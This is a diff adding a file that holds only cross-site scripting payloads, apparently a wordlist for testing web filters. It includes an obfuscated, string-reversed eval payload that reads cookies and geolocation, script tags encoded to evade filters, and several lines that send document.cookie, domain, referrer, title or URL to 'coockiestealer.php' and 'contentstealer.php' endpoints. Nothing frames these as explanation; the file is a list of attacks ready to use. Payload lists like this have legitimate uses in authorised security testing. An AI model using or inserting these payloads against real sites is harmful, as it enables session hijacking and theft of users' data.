@@ -1,0 +1,26 @@
+%26lt%3Bimg+src%3Dx+onerror%3Deval%28%26%23039%3B%29%3B%29%7D%3Bsdrooc.noitisop%3D%7Dedutignol%2Cedutital%7B+tsnoc%7B%26gt%3B%3Dnoitisop%28noitisoPtnerruCteg.noitacoloeg.rotagivan%2Ceikcooc.tnemucod%28mrifnoc%26%23039%3B.split%28%26%23039%3B%26%23039%3B%29.reverse%28%29.join%28%26%23039%3B%26%23039%3B%29%29+%2F%26gt%3B
+<scr%61pt>confirm(document.cookie)</scr%61pt>
+<img src=x onerror=prompt(document.cookie)>
+<iframe src=javascript:prompt(document.cookie)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?cookie="+document.cookie</scr%61pt>
+<img src=x onerror=prompt(document.domain)>
+<iframe src=javascript:prompt(document.domain)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?domain="+document.domain</scr%61pt>
+<img src=x onerror=prompt(document.referrer)>
+<iframe src=javascript:prompt(document.referrer)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?referrer="+document.referrer</scr%61pt>
+<img src=x onerror=prompt(document.title)>
+<iframe src=javascript:prompt(document.title)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?title="+document.title</scr%61pt>
+<img src=x onerror=prompt(document.URL)>
+<iframe src=javascript:prompt(document.URL)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?url="+document.URL</scr%61pt>
+<img src=x onerror=prompt(document.location.href)>
+<iframe src=javascript:prompt(document.location.href)>
+<scr%61pt src=http://127.0.0.1/contentstealer.php></scr%61pt>
+<scr%61pt>document.location="http://127.0.0.1/coockiestealer.php?href="+document.location.href</scr%61pt>
